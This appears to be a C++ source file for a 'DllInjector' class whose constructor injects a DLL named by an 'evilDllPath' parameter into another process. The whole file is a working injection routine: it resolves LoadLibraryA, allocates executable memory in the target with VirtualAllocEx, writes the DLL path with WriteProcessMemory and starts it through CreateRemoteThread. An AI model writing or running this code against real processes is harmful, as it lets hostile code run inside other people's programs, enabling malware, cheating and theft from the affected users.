#include "DllInjector.h"
#include <iostream>
#include <filesystem>


DllInjector::DllInjector(const Handle& pHandle, const std::string& evilDllPath)

{
	HMODULE hKernel32 = GetModuleHandle(L"Kernel32");

	if (hKernel32 != 0) {
		VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
		LPVOID loc = VirtualAllocEx(pHandle.getRawHandle(), 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (loc) WriteProcessMemory(pHandle.getRawHandle(), loc, evilDllPath.c_str(), evilDllPath.size() + 1, NULL);
		HANDLE hThread = CreateRemoteThread(pHandle.getRawHandle(), NULL, 0, (LPTHREAD_START_ROUTINE)lb, loc, 0, NULL);
	}
}
